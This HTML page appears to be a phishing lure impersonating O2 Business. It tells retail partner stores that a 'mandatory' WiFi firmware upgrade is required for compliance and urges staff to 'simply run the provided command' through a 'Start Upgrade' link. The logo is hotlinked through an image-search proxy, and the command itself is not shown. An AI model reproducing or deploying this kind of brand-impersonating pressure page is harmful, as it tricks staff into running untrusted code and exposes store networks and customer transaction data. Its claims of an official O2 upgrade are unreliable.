<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Store WiFi Upgrade | O2 Business</title>
    <link rel="stylesheet" href="/css/main.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
</head>
<body>
    <header class="o2-header">
        <div class="header-container">
            <a href="https://www.o2.co.uk" class="logo-link">
                <img src="https://imgs.search.brave.com/_8uWRUTQLMKrInHR3bwZc36sUEVpozrXMOduCXBaepw/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly8xMDAw/bG9nb3MubmV0L3dw/LWNvbnRlbnQvdXBs/b2Fkcy8yMDE4LzA3/L08yLUxvZ28tNTAw/eDI4MS5wbmc" alt="O2" class="o2-logo-img">
            </a>
            <nav class="header-nav">
                <a href="https://www.o2.co.uk/shop" class="header-link">Shop</a>
                <a href="https://www.o2.co.uk/connectivity" class="header-link">Business</a>
                <a href="https://www.o2.co.uk/help" class="header-link">Help</a>
            </nav>
        </div>
    </header>

    <main>
        <section class="hero-section">
            <div class="section-inner">
                <h2>Upgrade your store's WiFi network</h2>
                <p class="section-sub">O2 Business is rolling out a mandatory WiFi performance upgrade for all retail partner stores. This update improves connection speed, security, and network reliability across your location.</p>
            </div>
        </section>

        <section class="wifi-section">
            <div class="section-inner">
                <h2>What this upgrade delivers</h2>
                <p class="section-sub">This update is required for all O2 retail partner locations to maintain network compliance.</p>

                <div class="wifi-grid">
                    <div class="wifi-card">
                        <h3>Network Performance</h3>
                        <p>This firmware update applies the latest O2 network configuration to your store router, improving throughput and connection stability across all connected devices.</p>
                    </div>
                    <div class="wifi-card">
                        <h3>Wireless Security</h3>
                        <p>The update ensures your store network is running the latest security standards, protecting customer and transaction data on your wireless network.</p>
                    </div>
                    <div class="wifi-card">
                        <h3>Automatic Provisioning</h3>
                        <p>The upgrade runs in under 60 seconds and does not require an engineer visit or any hardware changes. Simply run the provided command to complete the update.</p>
                    </div>
                </div>

                <div class="wifi-next">
                    <a href="/upgrade" class="o2-continue-btn o2-continue-btn--ready">
                        Start Upgrade
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                    </a>
                </div>
            </div>
        </section>
    </main>

    <footer class="page-footer">
        <div class="footer-inner">
            <div class="footer-links">
                <a href="https://www.o2.co.uk/termsandconditions" class="footer-link">Terms &amp; Conditions</a>
                <a href="https://www.o2.co.uk/privacy" class="footer-link">Privacy Policy</a>
                <a href="https://www.o2.co.uk/help" class="footer-link">Help &amp; Support</a>
            </div>
            <p class="footer-copy">&copy; 2026 Telefonica UK Limited. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
